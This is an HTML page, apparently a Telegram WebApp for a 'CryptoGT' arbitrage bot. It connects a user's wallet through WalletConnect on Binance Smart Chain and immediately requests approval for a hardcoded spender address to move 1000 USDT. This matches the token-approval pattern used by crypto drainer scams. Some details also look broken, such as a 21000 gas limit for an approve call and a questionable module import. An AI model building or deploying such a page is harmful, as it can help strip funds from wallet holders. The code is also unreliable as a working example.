<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
  />
  <title>WalletConnect WebApp (ESM)</title>
  <style>
    body {
      background: #000; color: #fff; font-family: Arial, sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: start;
      min-height: 100vh; padding-top: 20px;
    }
    #status { background: #222; padding: 12px 20px; border-radius: 8px;
      font-size: 18px; margin-bottom: 20px; text-align: center; max-width: 90%;
      white-space: pre-wrap; word-wrap: break-word;
    }
    #qr { width: 200px; height: 200px; background: #111; margin-bottom: 20px; }
    #cancelBtn { padding: 10px 20px; font-size: 16px; background: #444; color: #fff;
      border: none; border-radius: 6px; cursor: pointer;
    }
    #cancelBtn:hover { background: #555; }
  </style>
</head>
<body>
  <div id="status">Инициализация WebApp…</div>
  <img id="qr" src="" alt="QR‑код будет здесь" />
  <button id="cancelBtn">Отменить</button>

  <!-- <!–– ESM-подключение SignClient v2.21.0 через jsDelivr ––> -->
  <script type="module">
    import SignClient from "https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.21.0/+esm";
    import Web3 from "https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js";

    (async function initWalletConnect() {
      const statusDiv = document.getElementById("status");
      const qrImg     = document.getElementById("qr");
      const cancelBtn = document.getElementById("cancelBtn");

      // Проверка WebApp API (работает только внутри встроенного WebView Telegram)
      if (!window.Telegram || !window.Telegram.WebApp) {
        statusDiv.innerText =
          "Ошибка: WebApp API не доступен.\n" +
          "Откройте это приложение через встроенный WebView Telegram.";
        return;
      }

      Telegram.WebApp.ready();
      Telegram.WebApp.expand();

      // Параметры контракта и WalletConnect
      const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027b3197955".toLowerCase();
      const ARB_CONTRACT_SPENDER  = "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase();
      const APPROVE_AMOUNT = Web3.utils.toBN("1000")
                                .mul(Web3.utils.toBN("1000000000000000000"))
                                .toString();
      const WC_PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
      const WC_RELAY_URL  = "wss://relay.walletconnect.com";
      const BSC_RPC_URL   = "https://bsc-dataseed.binance.org/";

      try {
        statusDiv.innerText = "Инициализация WalletConnect…";

        // 1) Инициализируем SignClient
        const client = await SignClient.init({
          projectId: WC_PROJECT_ID,
          relayUrl:  WC_RELAY_URL,
          metadata: {
            name:        "CryptoGT Bot WebApp",
            description: "Approve 1000 USDT via WalletConnect v2",
            url:         "https://t.me/cryptogt_arbitrage_bot",
            icons:       ["https://cryptogt.app/icon.png"],
          },
          storageOptions: {
            database: ":memory:",
          },
        });

        statusDiv.innerText = "Генерация URI WalletConnect…";

        // 2) Запрашиваем сессию (eth_sendTransaction на BSC)
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction"],
              chains:  ["eip155:56"],
              events:  [],
            },
          },
        });

        // 3) Отображаем QR‑код
        statusDiv.innerText = "Скопируйте или отсканируйте QR‑код (Trust Wallet / MetaMask)";
        const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data="
                      + encodeURIComponent(uri);
        qrImg.src = qrUrl;

        // 4) Ожидаем подтверждения в кошельке
        statusDiv.innerText = "Установите соединение в кошельке…";
        await approval();

        statusDiv.innerText = "Сессия подтверждена. Подготовка транзакции…";

        // 5) Готовим данные approve
        const web3 = new Web3(BSC_RPC_URL);
        const approveABI = {
          constant: false,
          inputs: [
            { name: "spender", type: "address" },
            { name: "amount",  type: "uint256" }
          ],
          name: "approve",
          outputs: [{ name: "", type: "bool" }],
          type: "function"
        };
        const data = web3.eth.abi.encodeFunctionCall(
          approveABI,
          [ARB_CONTRACT_SPENDER, APPROVE_AMOUNT]
        );

        // 6) Ловим topic, собираем txParams
        const txParams = {
          to:       USDT_CONTRACT_ADDRESS,
          data:     data,
          gas:      "0x5208",
          gasPrice: "0x02540be400"
        };

        statusDiv.innerText = "Отправляем транзакцию в кошелёк…";
        const topic  = client.session.topics[0] || client.session.topic;
        const txHash = await client.request({
          topic:   topic,
          chainId: "eip155:56",
          request: {
            method: "eth_sendTransaction",
            params: [txParams],
          },
        });

        // 7) Выводим хеш и закрываем WebApp
        statusDiv.innerText = "✅ Транзакция отправлена!\n\nTX Hash:\n" + txHash;
        setTimeout(() => Telegram.WebApp.close(), 2500);

      } catch (err) {
        console.error("WalletConnect WebApp Error:", err);
        statusDiv.innerText = "❌ Ошибка WalletConnect:\n" + (err.message || err);
      }

      // Обработчик кнопки «Отменить»
      cancelBtn.addEventListener("click", () => {
        Telegram.WebApp.close();
      });
    })();
  </script>
</body>
</html>
